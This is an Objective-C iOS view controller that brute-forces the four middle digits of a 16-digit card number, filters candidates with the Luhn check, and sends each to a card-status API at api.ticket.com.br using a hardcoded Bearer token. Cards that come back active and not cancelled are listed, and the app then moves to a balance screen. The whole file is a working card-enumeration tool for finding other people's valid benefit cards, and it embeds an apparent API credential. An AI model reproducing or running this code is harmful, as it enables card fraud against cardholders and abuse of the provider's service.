//
//  ViewController.m
//  LuhnAlgorithm
//
//  Created by Ticket Services on 12/09/17.
//  Copyright © 2017 UedaSoft IT Solutions. All rights reserved.
//
#define TCKContentType @"Content-Type"
#define TCKContentTypeAppJson @"application/json"

#import "ViewController.h"
#import "BalanceViewController.h"
@interface ViewController ()
@property(nonatomic, strong) NSMutableArray *possibilitiesNOSPACES;
@property(nonatomic, strong) NSMutableArray *possibilities;
@property(nonatomic, strong) NSMutableArray *validCards;
@property(nonatomic, strong) NSString *selectedCardNumber;
@property(assign) NSInteger operations;
@property(assign) NSInteger maxOperations;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    //self.txtCardNumber.text = @"6033425800007311";
    self.tblPossibilities.delegate = self;
    self.possibilities = [NSMutableArray array];
    self.possibilitiesNOSPACES = [NSMutableArray array];
    self.validCards = [NSMutableArray array];

    self.operations = -1;
    self.maxOperations = 0;
    
    
    [[NSNotificationCenter defaultCenter] addObserver:self
                                             selector:@selector(didRunAllOperations:)
                                                 name:@"AllOperations" object:nil];
    
    [self.btnValidate setHidden: YES];
    
    
//    self.tblPossibilities.backgroundView = self.activityIndicator;
//    [self.activityIndicator startAnimating];
//    self.tblPossibilities.separatorStyle = UITableViewCellSeparatorStyleNone;

    
    // Do any additional setup after loading the view, typically from a nib.
}


- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}


-(void) prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender
{
    BalanceViewController *destinationViewController = segue.destinationViewController;
    if([destinationViewController isKindOfClass: [BalanceViewController class]])
    {
        destinationViewController.lblCardNumber.text = self.selectedCardNumber;
        destinationViewController.selectedCardNumber = self.selectedCardNumber;
    }
}


-(IBAction) verify: (id) sender
{
    NSString *strCardNumber = self.txtCardNumber.text ?:@"";
    self.possibilities = [NSMutableArray array];
    self.possibilitiesNOSPACES = [NSMutableArray array];
     [self.btnValidate setHidden: YES];

    if([strCardNumber length] == 16)
    {
        
        for (NSInteger i = 0; i<10000; i++)
        {
            
            NSString *suffix =[strCardNumber substringFromIndex:12];
            NSString *prefix = [strCardNumber substringToIndex:8];
            NSString *paddedStr = [NSString stringWithFormat:@"%04ld", i];
            
            strCardNumber = [NSString stringWithFormat: @"%@%@%@", prefix,paddedStr, suffix];
            
            if([Luhn validateString: strCardNumber])
            {
                NSString *suffix =[strCardNumber substringFromIndex:12];
                NSString *prefix = [strCardNumber substringWithRange: NSMakeRange(0, 4)];
                NSString *prefix2 = [strCardNumber substringWithRange: NSMakeRange(4, 4)];
                NSString *mistery = [strCardNumber substringWithRange: NSMakeRange(8, 4)];
                [self.possibilitiesNOSPACES addObject: strCardNumber];
                [self.possibilities addObject: [NSString stringWithFormat: @"%@ %@ %@ %@", prefix, prefix2, mistery, suffix]];

            }
        
        }
        
        if([self.possibilitiesNOSPACES count]>0)
        {
            [self.btnValidate setHidden: NO];
        }
        NSLog(@"");
    }
}



-(IBAction) analyse: (id) sender
{
    if([self.possibilitiesNOSPACES count]>0){
        NSInteger noOfCards = [self.possibilitiesNOSPACES count];
        self.operations = 0;
        self.maxOperations = noOfCards;
        for (NSInteger i = 0; i< noOfCards; i++)
            [self analyseCardStatus:[self.possibilitiesNOSPACES objectAtIndex: i]];
    }


}

-(void) analyseCardStatus: (NSString*) cardNumber
{
    NSURL *url = [NSURL URLWithString:@"https://api.ticket.com.br/usuarios/cartoes/v1/status"];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    
    [request setHTTPMethod: @"POST"];
    
    [request setAllHTTPHeaderFields: @{TCKContentType : TCKContentTypeAppJson,
                                       @"Authorization" : @"Bearer 6bf7528050751bf29e1cd1a5b8b8621"}];
    
    NSString *requestBody = [NSString stringWithFormat: @"{\"cartao\":{\"numero\": \"%@\"}}", cardNumber];
    [request setHTTPBody:[requestBody dataUsingEncoding:NSUTF8StringEncoding]];
    
    
    NSURLSessionDataTask *dataTask = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^( NSData *data, NSURLResponse *response, NSError *error)
     {
         
         if (error)
         {
             NSLog(@"Error: %@", error);
         }
         else
         {
             if(response)
             {
                 self.operations++;
                 NSDictionary *dictFromData = [NSJSONSerialization JSONObjectWithData:data
                                                                              options:NSJSONReadingAllowFragments
                                                                                error:&error];
                 
                 if(dictFromData)
                 {
                     NSDictionary *listaStatus = [dictFromData objectForKey: @"listaStatus"];
                     if(listaStatus)
                     {
                         NSDictionary *statusCartao = [listaStatus objectForKey: @"statusCartao"];
                         NSNumber *active = [statusCartao objectForKey: @"ativo"]? [statusCartao objectForKey: @"ativo"]:@0;
                         NSNumber *cancelled = [statusCartao objectForKey: @"cancelado" ] ? [statusCartao objectForKey: @"cancelado"]: @1;
                         if([active boolValue])
                         {
                             if([active boolValue]== true)
                             {
                                 if([cancelled boolValue] !=1)
                                 {
                                     [self.validCards addObject: cardNumber];
                                     NSLog(@"Valid! %@", cardNumber);
                                 }
                             }
                         }
                     }
                 }
             }
             
             if (self.operations== (self.maxOperations -1))
             {
                 [[NSNotificationCenter defaultCenter] postNotificationName:@"AllOperations" object:nil];
             }

         }
     }];
    
    [dataTask resume];
    
    
}


- (void)URLSession:(NSURLSession *)session
          dataTask:(NSURLSessionDataTask *)dataTask
    didReceiveData:(NSData *)data
{
    NSLog(@"OK!");

}


- (void) didRunAllOperations:(NSNotification*)notification {
//    [self.activityIndicator stopAnimating];
//    self.tblPossibilities.separatorStyle = UITableViewCellSeparatorStyleSingleLine;
    
    dispatch_async(dispatch_get_main_queue(),^{
        
        [self.tblPossibilities reloadData];
    });

    
    

}

#pragma mark - UITableViewDataSource & Delegate

- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section{
    if(self.validCards)
    {
        return [self.validCards count];
    }
    
    return 0;
}

- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView
{
    return 1;
}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath;
{
    NSString *cellIdentifier = @"Cell";
    
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier: cellIdentifier forIndexPath: indexPath];
    cell.textLabel.text = [self.validCards objectAtIndex: indexPath.row];
    return cell;

}

- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
    self.selectedCardNumber = @"";
    NSString *cardNumber = [self.validCards objectAtIndex: indexPath.row];
    if(cardNumber)
    {
        self.selectedCardNumber = cardNumber;
        [self performSegueWithIdentifier:@"BalanceSegue" sender:self];
    }
    [tableView deselectRowAtIndexPath: indexPath animated:YES];
}


//https://api.ticket.com.br/usuarios/cartoes/v1/saldo

@end
